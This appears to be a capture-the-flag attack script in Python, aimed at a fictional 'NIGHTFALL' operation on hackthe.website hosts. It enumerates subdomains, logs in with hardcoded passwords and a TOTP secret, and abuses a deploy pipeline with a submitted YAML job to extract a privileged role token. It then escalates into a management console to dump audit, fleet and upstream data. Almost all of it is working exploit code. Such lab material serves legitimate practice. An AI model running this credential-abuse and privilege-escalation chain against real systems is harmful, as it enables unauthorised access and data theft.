#!/usr/bin/env python3
"""ACT 4 host discovery. Three fronts:
  A) probe candidate *.hackthe.website hosts (nginx vhost -> app vs default).
  B) control hub: authenticate, scrape dashboard links + 'RECENT OPERATIONS' feed,
     probe audit/ledger/operations endpoints.
  C) master mgmt console (already owned): mint a fresh mstr- token via the Runner
     chain, auth, then read the AUDIT ledger + FLEET endpoints + BUS routes +
     operators/directives/overview/upstream -> the 'systems behind NIGHTFALL'.
Collect every new hostname / onion / host:port reference, and scan for flags.
"""
import re, json, base64, hmac, hashlib, struct, time
import requests, urllib3
urllib3.disable_warnings()

TOTP_SECRET = "JBSWY3DPEHPK3PXP"
USER, PASS = "ops_dispatcher", "Ops-Fall-2026!"
RUN, MST, CTL = "https://runner.hackthe.website", "https://master.hackthe.website", "https://control.hackthe.website"
VAULT_TOKEN = "dply-9f2a41c0b7e3d6a8e15c93f2b4a70d68"
ESCROW_KEY  = "8f2a1b9c8d7e6f5a4b3c2d1e0f9a8b7c"
BUS_TOKEN   = "cb-91e2f407a6c84b503d9f1c2a7e8b4d65"

FLAG = re.compile(r'dome\.ctf\{[^}]+\}')
HOST = re.compile(r'\b([a-z0-9][a-z0-9\-]{1,40}\.(?:hackthe\.website|onion|internal))\b', re.I)
HOSTPORT = re.compile(r'\b((?:https?://)?[a-z0-9.\-]+:\d{2,5}[/\w.\-]*)\b', re.I)
flags, hosts, hostports = set(), set(), set()
def harvest(t, where=""):
    t = str(t)
    for m in FLAG.finditer(t):
        if m.group() not in flags: flags.add(m.group()); print(f"   *** FLAG [{where}]: {m.group()} ***")
    for m in HOST.finditer(t): hosts.add(m.group(1).lower())
    for m in HOSTPORT.finditer(t): hostports.add(m.group(1))

def totp():
    k = base64.b32decode(TOTP_SECRET)
    h = hmac.new(k, struct.pack(">Q", int(time.time()//30)), hashlib.sha1).digest()
    o = h[-1] & 15
    return str((struct.unpack(">I", h[o:o+4])[0] & 0x7fffffff) % 10**6).zfill(6)

# ============================================================ A) host probing
print("="*60, "\nA) CANDIDATE HOST PROBE\n" + "="*60)
cands = ["control","master","management","console","audit","ledger","marketplace",
    "upstream","portal","nightfall","kage","kagegate","verifier","approvals","escrow",
    "ghost","runner","telemetry","vault","bus","ops","dispatch","gateway","hub","admin",
    "c2","command","registry","evidence","daybreaker","nightrun","contact","lantern"]
for h in cands:
    host = f"{h}.hackthe.website"
    try:
        r = requests.get(f"https://{host}/", timeout=10, verify=False, allow_redirects=False)
        title = ""
        mt = re.search(r'<title[^>]*>([^<]+)</title>', r.text, re.I)
        if mt: title = mt.group(1).strip()[:50]
        loc = r.headers.get("Location", "")
        srv = r.headers.get("Server", "")
        marker = "APP" if (r.status_code in (200,301,302,303,307,308) and (title or loc)) else "?"
        print(f"  [{r.status_code:>3}] {host:34} {marker:3} srv={srv:10} loc={loc[:40]} title={title}")
        harvest(r.text, host); harvest(loc, host)
    except Exception as e:
        print(f"  [ - ] {host:34} ({type(e).__name__})")

# ============================================================ B) control hub
print("\n" + "="*60, "\nB) CONTROL HUB (dashboard links + recent ops)\n" + "="*60)
cs = requests.Session(); cs.verify = False
cs.headers.update({"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"})
print("  login:", cs.post(f"{CTL}/api/login", json={"username":USER,"password":PASS}, timeout=15).status_code,
      " otp:", cs.post(f"{CTL}/api/otp/verify", json={"otp":totp()}, timeout=15).status_code)
for path in ["/", "/dashboard", "/console", "/api/flag", "/api/operations", "/api/recent",
             "/api/audit", "/api/ledger", "/api/dashboard", "/api/overview", "/api/systems",
             "/api/activity", "/api/feed", "/api/links"]:
    try:
        r = cs.get(CTL+path, timeout=12)
        ct = r.headers.get("Content-Type","")
        if r.status_code == 200 and len(r.text) > 2:
            hrefs = re.findall(r'href=["\']([^"\']+)["\']', r.text)
            interesting = [h for h in hrefs if "hackthe.website" in h or h.startswith("/api") or ".onion" in h]
            snippet = r.text[:200].replace("\n"," ") if "json" in ct or "<" not in r.text[:5] else ""
            print(f"  200 {path:18} {ct[:20]:20} hrefs={interesting[:6]} {snippet}")
            harvest(r.text, f"control{path}")
        else:
            print(f"  {r.status_code} {path}")
    except Exception as e:
        print(f"   err {path}: {type(e).__name__}")

# ============================================================ C) master console
print("\n" + "="*60, "\nC) MASTER MGMT CONSOLE (audit / fleet / bus / ...)\n" + "="*60)
# mint fresh mstr- token via Runner
rs = requests.Session(); rs.verify = False; rs.headers.update({"User-Agent":"Mozilla/5.0"})
rs.post(f"{RUN}/login", data={"token":VAULT_TOKEN}, timeout=20)
k = rs.post(f"{RUN}/api/v1/keys", json={"name":"ops","description":"m","role":"deployer"}, timeout=20).json().get("key",{})
privkey = k.get("key") if isinstance(k,dict) else k
yaml = ("job_name: s\npipeline_version: '3.0'\nenvironment: escrow_mainnet\nsteps:\n  - name: s\n"
        f"    command: /usr/local/bin/escrow_release --execute --key={ESCROW_KEY} --target=/var/lib/escrow/ledger.enc\n")
out = rs.post(f"{RUN}/api/v1/deploy", headers={"Authorization":f"Bearer {privkey}","Content-Type":"application/x-yaml"},
              data=yaml, timeout=40).json().get("parsed_output","")
mstr = (re.search(r'(mstr-[0-9a-zA-Z]+)', str(out)) or [None,None])[1] if re.search(r'mstr-', str(out)) else None
m = re.search(r'(mstr-[0-9a-zA-Z]+)', str(out))
mstr = m.group(1) if m else None
print("  fresh role token:", mstr)

ms = requests.Session(); ms.verify = False
ms.headers.update({"User-Agent":"Mozilla/5.0","Content-Type":"application/json"})
ms.post(f"{MST}/api/login", json={"username":USER,"password":PASS}, timeout=20)
ms.post(f"{MST}/api/otp/verify", json={"otp":totp()}, timeout=20)
print("  role auth:", ms.post(f"{MST}/api/auth/role", json={"role_token":mstr}, timeout=20).status_code)

for path in ["/api/mgmt/overview","/api/mgmt/operators","/api/mgmt/directives",
             "/api/mgmt/fleet","/api/mgmt/bus","/api/mgmt/audit","/api/mgmt/records?scope=operator",
             "/api/mgmt/upstream"]:
    try:
        r = ms.get(MST+path, timeout=20)
        print(f"\n  --- {path} ({r.status_code}) ---")
        print("  " + r.text[:900].replace("\n","\n  "))
        harvest(r.text, path)
    except Exception as e:
        print(f"  err {path}: {e}")

# verify-and-establish the upstream link (the 'systems behind NIGHTFALL')
try:
    r = ms.post(f"{MST}/api/mgmt/upstream", json={"reference":"ctr-ops.alias-7f3a"}, timeout=20)
    print(f"\n  --- POST upstream (ref=ctr-ops.alias-7f3a) {r.status_code} ---\n  {r.text[:400]}")
    harvest(r.text, "upstream-post")
    for _ in range(3):
        time.sleep(2)
        rg = ms.get(f"{MST}/api/mgmt/upstream", timeout=20)
        print(f"  upstream GET: {rg.text[:400]}")
        harvest(rg.text, "upstream-get")
        if "ESTABLISHED" in rg.text: break
except Exception as e:
    print("  upstream err:", e)

# ============================================================ summary
print("\n" + "="*60, "\nDISCOVERED\n" + "="*60)
print("hosts:")
for h in sorted(hosts): print("   -", h)
print("host:port refs:")
for h in sorted(hostports): print("   -", h)
print("FLAGS:", sorted(flags) or "(none)")
